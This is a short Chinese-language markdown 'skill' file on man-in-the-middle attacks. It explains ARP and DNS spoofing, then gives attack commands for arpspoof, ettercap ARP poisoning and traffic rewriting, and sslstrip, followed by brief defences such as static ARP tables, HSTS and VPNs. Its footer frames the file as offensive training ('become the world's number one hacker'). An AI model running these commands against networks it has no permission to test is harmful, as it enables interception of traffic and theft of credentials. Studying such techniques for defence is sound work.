# 中间人攻击(MITM)Skill

## 简介
中间人攻击是一种网络攻击，攻击者位于通信双方之间，拦截和篡改通信内容。

## 攻击原理

### 1. 基本流程
```
[受害者] <-----> [攻击者] <-----> [目标服务器]
   发送数据        拦截/篡改        接收数据
```

### 2. ARP欺骗
- 发送伪造ARP包
- 绑定目标IP到攻击者MAC
- 流量经过攻击者

### 3. DNS欺骗
- 伪造DNS响应
- 将域名解析到恶意IP

## 攻击工具

### 1. ARP欺骗
```bash
arpspoof -i eth0 -t targetIP gatewayIP
ettercap -i eth0 -M arp:remote /target// /gateway//
```

### 2. SSL剥离
```bash
sslstrip -f -k target.com
```

### 3. 会话劫持
```bash
ettercap -i eth0 -M arp:remote /targetIP// /gatewayIP// -E "replace body"
```

## 防御措施

### 1. ARP防护
- 静态ARP表
- ARP防火墙

### 2. HTTPS
- 证书验证
- HSTS

### 3. VPN
- 加密通道
- 密钥交换

---
*目标: 成为世界第一黑客*
*类型: 网络渗透*
